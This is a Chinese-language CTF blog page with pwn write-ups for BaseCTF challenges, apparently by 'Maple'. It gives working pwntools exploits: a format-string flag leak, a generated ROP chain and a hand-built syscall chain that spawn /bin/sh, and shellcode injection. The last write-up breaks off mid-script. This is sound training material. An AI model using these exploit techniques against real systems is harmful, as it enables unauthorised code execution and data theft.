    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/8th_format_string_level0/format_string_level0/format_string_level0/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:38:11" itemprop="dateModified" datetime="2025-02-11T16:38:11+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“string-format-level0”"><a href="#Basectf-pwn方向“string-format-level0”" class="headerlink" title="Basectf pwn方向“string_format_level0”"></a>Basectf pwn方向“string_format_level0”</h1><p>by Maple</p>
<p>题目就是提示，格式化字符串主要的点就是找到偏移量（也可以直接一个个试试，不会太多）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="偏移量计算"><a href="#偏移量计算" class="headerlink" title="偏移量计算"></a>偏移量计算</h2><p><img src="/image.png" alt="alt text"></p>
<p>这里elf先是打开了flag文件，并且把flag的内容read到v6中，此时flag的值就在栈上，所以只要将flag从栈上泄露出来就好，刚好下面就有printf，存在格式化字符串漏洞</p>
<p><img src="/image-1.png" alt="alt text"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;./vuln</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffe277639f0 0x100 0x7effbc4807e2 0x21001 0x55aedd9902a0 (nil) 0x300000000 0x55aedd9902a0 0x10 0x2070252061616161 0x7025207025207025</span><br></pre></td></tr></table></figure>

<p>可以看到我们输入的数据相对于栈的偏移为10，而flag在我们写入数据的上面两行，所以相对于栈的偏移是8</p>
<p>所以其实nc之后%8$s就行（将第8位以%s的格式输出）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/7th_gift/giftwp/gift/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/7th_gift/giftwp/gift/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:37:56" itemprop="dateModified" datetime="2025-02-11T16:37:56+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“gift”"><a href="#Basectf-pwn方向“gift”" class="headerlink" title="Basectf pwn方向“gift”"></a>Basectf pwn方向“gift”</h1><p>by Maple</p>
<p>发现给了很多函数，但是其实没有什么可以用的地方，还开启canary了,但是有可读可写可执行的段，问题不大</p>
<p>因为有很多函数，看看是不是ret2syscall，查一下有没有足够的gaget</p>
<p><img src="/image.png" alt="alt text"></p>
<p><em>绰绰有余</em>.</p>
<p>直接<code>ROPgadget --binary gift --ropchain</code>一把梭了，反正gets不限长度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">io=process(<span class="string">&#x27;./gift&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419484</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044a5e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043d350</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044a5e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401f2f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000409f9e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000047f2eb</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004c50e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043d350</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401ce4</span>) <span class="comment"># syscall</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h2><p>在shellcode1中讲过，rax存放系统调用号，然后将想调用函数的对应参数放入到对应的寄存器里（rdi，rsi，rdx）</p>
<p>ida里并没有发现<code>/bin.sh</code>，所以我们应该先构造read函数写入&#x2F;bin&#x2F;sh（类似shellcode1），接着调用execve(调用号是8)</p>
<ol>
<li>寻找目标gaget<ol>
<li>pop_rax_ret &#x3D; 0x0000000000419484</li>
<li>pop_rdi_ret &#x3D; 0x0000000000401f2f</li>
<li>pop_rsi_ret &#x3D; 0x0000000000409f9e</li>
<li>pop_rdx_rbx_ret &#x3D; 0x000000000047f2eb</li>
<li>syscall &#x3D; 0x0000000000401ce4</li>
</ol>
</li>
<li>payload</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(rax)+p64(<span class="number">0x0</span>)+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">0x10</span>)+p64(<span class="number">0x0</span>)+p64(syscall)</span><br><span class="line">payload += p64(rax)+p64(<span class="number">0x3b</span>)+p64(rdi)+p64(<span class="number">0x498ac9</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(syscall) </span><br></pre></td></tr></table></figure>

<p>附：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SUKI547/article/details/103315487">系统调用表</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/6th_shellcode1/shellcode1/shellcode1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/6th_shellcode1/shellcode1/shellcode1/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:37:41" itemprop="dateModified" datetime="2025-02-11T16:37:41+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“shellcode-level1”"><a href="#Basectf-pwn方向“shellcode-level1”" class="headerlink" title="Basectf pwn方向“shellcode_level1”"></a>Basectf pwn方向“shellcode_level1”</h1><p>by Maple</p>
<p>根据题目提示，还是shellcode,仔细观察一下先</p>
<p><img src="/image-5.png" alt="alt text"></p>
<p>开启了pie保护和canary保护</p>
<p><img src="/image-6.png" alt="alt text"></p>
<p>read只允许读入两个字节长度，而下面出现了一串很长的看不懂的东西<code>((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);</code></p>
<p>我是扔给ai看去了，这么说</p>
<p><img src="/image.png" alt="alt text"></p>
<p>总之呢就是一个调用的过程，取决于buf怎么写</p>
<p>所以这一段呢就是，如果mmap函数开辟空间争取却，就会向buf里读入两个字节，然后把buf空间里的内容当作函数执行。</p>
<p>那很自然可以想到，将写shellcode到buf里执行就好了。但是pie保护的开启，导致我们直接找buf地址并写入shellcode不太行</p>
<p>那怎么写入呢，检查一下汇编代码（没思路就去扒扒汇编码）</p>
<p><img src="/image-1.png" alt="alt text"></p>
<p>在<code>read(0,buf,2ull)</code>之后，有向寄存器赋值的汇编代码，并且会调用rcx寄存器里面的内容的操作，那是不是可以向rcx里写一个函数，然后如果这个函数的功能是向buf里读取内容，是不是就可以写shellcode进去了。</p>
<p>有这个函数嘛，字长仅两位的话的确没有，但还有另一个函数<code>syscall</code>系统调用函数，并且<code>rax=0</code>,<code>rdx=500h</code>,<code>rsi=[buf]</code>，完美符合要求，所以exp就很好构造了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.send(asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2</span>+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用是操作系统提供给用户程序的一种接口。当用户程序需要操作系统内核的服务时，就会通过系统调用进入内核模式。例如，当一个应用程序需要读取文件内容时，它会发起一个读文件的系统调用。这就好比用户程序是“顾客”，操作系统内核是“服务员”，系统调用就是“点菜”的过程，用户程序告诉内核它需要什么服务。</p>
<p><img src="/image-2.png" alt="alt text"></p>
<p>且<code>syscall</code>函数系统调用号的参数所在寄存器为rax，在这里为0，说明其实调用了read函数</p>
<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<ul>
<li>fd：文件描述符，存放寄存器为rdi</li>
<li>buf:数据化冲区指针（这里mmap已经申请很大一块可读可写可执行的内存了），存放在rsi寄存器中</li>
<li>count:要读取的字节数：存放在rdx寄存器中</li>
</ul>
<p>再对照上面的汇编码看看，此时的调用变为了<code>read(0,buf,0x500)</code>可以直接写入</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basectf/5th_%E5%A5%B9%E4%B8%8E%E4%BD%A0%E7%9A%86%E5%A4%B1/tynjs/tynjs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basectf/5th_%E5%A5%B9%E4%B8%8E%E4%BD%A0%E7%9A%86%E5%A4%B1/tynjs/tynjs/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-11 16:37:22" itemprop="dateModified" datetime="2025-02-11T16:37:22+08:00">2025-02-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Basectf-pwn方向“她与你皆失”"><a href="#Basectf-pwn方向“她与你皆失”" class="headerlink" title="Basectf pwn方向“她与你皆失”"></a>Basectf pwn方向“她与你皆失”</h1><p>by Maple</p>
<p><code>ret2libc</code>,新手上路的第一块绊脚石，这道题是很标准的两步走，先泄露libc再getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span 